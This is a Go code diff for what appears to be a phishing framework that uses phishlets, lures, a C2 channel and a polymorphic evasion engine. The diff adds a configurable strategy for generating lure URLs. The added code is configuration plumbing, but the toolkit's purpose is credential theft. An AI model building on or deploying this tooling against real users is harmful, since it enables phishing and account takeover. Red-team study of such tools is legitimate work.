@@ -109,6 +109,10 @@ type CloudflareConfig struct {
 	Enabled         bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
 }
 
+type LureGenerationConfig struct {
+	Strategy string `mapstructure:"strategy" json:"strategy" yaml:"strategy"` // short, medium, long, realistic, hex, base64, mixed
+}
+
 type GeneralConfig struct {
 	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
 	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
@@ -139,6 +143,7 @@ type Config struct {
 	c2ChannelConfig *C2Config
 	polymorphicConfig *PolymorphicConfig
 	cloudflareWorkerConfig *CloudflareConfig
+	lureGenerationConfig *LureGenerationConfig
 	phishletConfig       map[string]*PhishletConfig
 	phishlets          map[string]*Phishlet
 	phishletNames      []string
@@ -172,6 +177,7 @@ const (
 	CFG_C2_CHANNEL = "c2_channel"
 	CFG_POLYMORPHIC = "polymorphic_engine"
 	CFG_CLOUDFLARE_WORKER = "cloudflare_worker"
+	CFG_LURE_GENERATION = "lure_generation"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -193,6 +199,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c2ChannelConfig: &C2Config{Enabled: false, Transport: "https", Servers: make([]C2Server, 0), HeartbeatInterval: 300, RetryInterval: 30, MaxRetries: 3, CertPinning: false, Compression: true, ChunkSize: 4096},
 		polymorphicConfig: &PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
 		cloudflareWorkerConfig: &CloudflareConfig{},
+		lureGenerationConfig: &LureGenerationConfig{Strategy: "realistic"},
 		phishletConfig:       make(map[string]*PhishletConfig),
 		phishlets:            make(map[string]*Phishlet),
 		phishletNames:        []string{},
@@ -1432,5 +1439,34 @@ func (c *Config) SetPolymorphicMutation(mutation string, enabled bool) {
 	c.polymorphicConfig.EnabledMutations[mutation] = enabled
 	c.cfg.Set(CFG_POLYMORPHIC, c.polymorphicConfig)
 	log.Info("Polymorphic mutation '%s' enabled: %v", mutation, enabled)
+	c.cfg.WriteConfig()
+}
+
+// Lure Generation Configuration
+func (c *Config) GetLureGenerationStrategy() string {
+	if c.lureGenerationConfig == nil {
+		return "realistic"
+	}
+	return c.lureGenerationConfig.Strategy
+}
+
+func (c *Config) SetLureGenerationStrategy(strategy string) {
+	validStrategies := []string{"short", "medium", "long", "realistic", "hex", "base64", "mixed"}
+	isValid := false
+	for _, s := range validStrategies {
+		if s == strategy {
+			isValid = true
+			break
+		}
+	}
+	
+	if !isValid {
+		log.Warning("Invalid lure generation strategy: %s. Using 'realistic' instead.", strategy)
+		strategy = "realistic"
+	}
+	
+	c.lureGenerationConfig.Strategy = strategy
+	c.cfg.Set(CFG_LURE_GENERATION, c.lureGenerationConfig)
+	log.Info("Lure generation strategy set to: %s", strategy)
 	c.cfg.WriteConfig()
 }
